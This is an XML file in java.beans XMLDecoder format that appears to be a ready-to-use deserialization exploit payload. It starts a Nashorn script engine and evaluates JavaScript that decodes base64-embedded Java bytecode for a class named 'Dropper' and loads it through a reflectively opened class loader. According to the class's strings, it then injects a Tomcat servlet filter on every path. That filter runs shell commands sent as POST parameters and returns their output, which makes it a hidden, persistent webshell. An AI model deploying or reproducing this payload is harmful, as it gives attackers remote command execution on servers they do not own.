<?xml version="1.0" encoding="UTF-8"?>
<java>
    <!-- see https://github.com/o2platform/DefCon_RESTing/blob/master/Demos/_O2_Scripts/XmlEncoder%20-%20Restlet/exploits/8e%20-%20HttpResponse%20-%20execute%20process%20-%20read%20two%20lines.xml -->
     <object class="javax.script.ScriptEngineManager">
        <void id="mgr" method="getEngineByName">
            <string>nashorn</string>
        </void>
    </object>
    <object idref="mgr">
        <void method="eval">
            <string>
                var className = "party.itistimeto.broodwich.Dropper";
                // todo: gzip
                var encodedBytecode = "yv66vgAAADMBSQoAoQCiCgChAKMHAKQKAAMApQsApgCnBwCoCgAGAKkLAKoAqwcArAgArQsAKgCuBwCvBwCwBwCxBwCyCgANALMKALQAtQoAJwC2CABcCgANALcKALgAtQoADwC5CgAPALoKAA8AuwcAvAoAGQC5CgAZALoKABkAvQsAqgC+CwAqAL8LAMAAwQsAwgDDCwDCAMQHAMUKABkAxgkAxwDICgDHAMkKABkAygcAywoAtADMCgC4AM0HAM4KAAYAzwoABgDQCwAqANEHANIKAC4A0woACQC5CgAJANQKACcAuQcA1QsAMwDWCwAzANcIANgKACIA2QgA2gsAMwDbCADcCADdCgDeAN8KAN4A4AoA4QDiCwDjAOQKAOUA5goA5wDoCADpCwDjAOoIAOsKAOwA7QcA7gEAC21vZHVsZUlkS2V5AQASTGphdmEvbGFuZy9TdHJpbmc7AQANQ29uc3RhbnRWYWx1ZQEAD21vZHVsZVBhcmFtc0tleQEACmZpbHRlck5hbWUBAAlhZGRGaWx0ZXIBACsoTGphdmF4L3NlcnZsZXQvRmlsdGVyO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAC3NlcnZsZXROYW1lAQAOYWZjQ29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQASZmlsdGVyQ29uZmlnc0ZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEACWZpbHRlckRlZgEAMUxvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZjsBAAlmaWx0ZXJNYXABADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7AQAMZmlsdGVyQ29uZmlnAQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZzsBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQABZQEAKExqYXZhL2xhbmcvUmVmbGVjdGl2ZU9wZXJhdGlvbkV4Y2VwdGlvbjsBAAZmaWx0ZXIBABZMamF2YXgvc2VydmxldC9GaWx0ZXI7AQAHcGF0dGVybgEAD3N0YW5kYXJkQ29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAFVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnOz47AQANU3RhY2tNYXBUYWJsZQcA7gcAxQcAqAcA7wcA8AcAsgcAvAcA8QcArwcAzgcAywcA8gcA0gEABXRhc3RlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAGPGluaXQ+AQADKClWAQAEdGhpcwEAJExwYXJ0eS9pdGlzdGltZXRvL2Jyb29kd2ljaC9Ecm9wcGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAPMBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZzdGRvdXQBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAdyZXNwb3V0AQAWTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEAA2J1ZgEAAltCAQABbgEAAUkBAAhtb2R1bGVJZAEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQASaHR0cFNlcnZsZXRSZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAMcGFyYW1ldGVyTWFwAQA2TGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOz47BwCsBwD0BwD1BwD2BwDVBwD3BwD4BwCHBwD5AQAHZGVzdHJveQEAClNvdXJjZUZpbGUBAAxEcm9wcGVyLmphdmEHAPoMAPsA/AwA/QD+AQAwb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlDAD/AQAHAQEMAQIBAwEAKG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQMAQQBBQcBBgwBBwEIAQAicGFydHkvaXRpc3RpbWV0by9icm9vZHdpY2gvRHJvcHBlcgEACWJyb29kd2ljaAwBCQEKAQAwb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnAQAPamF2YS9sYW5nL0NsYXNzAQAbb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0AQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWYMAQsBDAcA7wwBDQEODAEPARAMAREBEgcA8AwAdwB4DAETAHYMARQBFQEAL29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwDAEWAHYMARcBCAwBGAEZBwEaDAEbARwHAPEMAR0BHgwBHwEgAQAQamF2YS9sYW5nL1N0cmluZwwBIQB2BwEiDAEjASQMASUBJgwBJwB2AQAQamF2YS9sYW5nL09iamVjdAwBKAEpDAEqASsBAA1qYXZhL3V0aWwvTWFwDAEsAS0MAS4BLwwBMAExAQAmamF2YS9sYW5nL1JlZmxlY3RpdmVPcGVyYXRpb25FeGNlcHRpb24MATIAeAwATABNAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwBMwEIDAE0ASYBAARQT1NUDAE1AQoBAA9icm9vZHdpY2hNb2R1bGUMATYBNwEABGV4ZWMBAA9icm9vZHdpY2hQYXJhbXMHATgMATkBOgwA3AE7BwE8DAE9AT4HAPUMAT8BQAcA9wwBQQFCBwD4DAFDAUQBAAVjaGVjawwBRQFGAQAJYmV3YXJlLi4uBwFHDAFIAHYBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABJqYXZhL3V0aWwvSXRlcmF0b3IBABNqYXZhL2xhbmcvVGhyb3dhYmxlAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABRqYXZhL2lvL091dHB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADGdldFJlc291cmNlcwEAJygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290OwEAI29yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290AQAKZ2V0Q29udGV4dAEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dDsBABFnZXRTZXJ2bGV0Q29udGV4dAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dAEAFmdldEZpbHRlclJlZ2lzdHJhdGlvbnMBABEoKUxqYXZhL3V0aWwvTWFwOwEAC2NvbnRhaW5zS2V5AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEZpbHRlck5hbWUBAAlzZXRGaWx0ZXIBABkoTGphdmF4L3NlcnZsZXQvRmlsdGVyOylWAQANYWRkVVJMUGF0dGVybgEAF2dldFNlcnZsZXRSZWdpc3RyYXRpb25zAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsBAA1qYXZhL3V0aWwvU2V0AQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEADmFkZFNlcnZsZXROYW1lAQAcamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZQEAB1JFUVVFU1QBAB5MamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZTsBAARuYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAA1zZXREaXNwYXRjaGVyAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADGFkZEZpbHRlckRlZgEANChMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWY7KVYBAAxhZGRGaWx0ZXJNYXABADQoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwOylWAQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBAA9nZXRQYXJhbWV0ZXJNYXABAAlnZXRNZXRob2QBAAZlcXVhbHMBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAJyhMamF2YS9sYW5nL1N0cmlu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";
                var bytecode = java.util.Base64.getDecoder().decode(encodedBytecode);
                var bytecodeBuffer = java.nio.ByteBuffer.wrap(bytecode);
                var sclClazz = java.security.SecureClassLoader.class;
                var sclConstructor = sclClazz.getDeclaredConstructor(java.lang.ClassLoader.class);
                sclConstructor.setAccessible(true);
                var scl = sclConstructor.newInstance(java.lang.Thread.currentThread().getContextClassLoader());
                var defineClass = sclClazz.getDeclaredMethod("defineClass", java.lang.String.class,
                java.nio.ByteBuffer.class, java.security.CodeSource.class);
                defineClass.setAccessible(true);
                var calcClass = defineClass.invoke(scl, className, bytecodeBuffer, null);
                calcClass.getMethod("taste", java.lang.String.class).invoke(null, "/*");
            </string>
        </void>
    </object>
</java>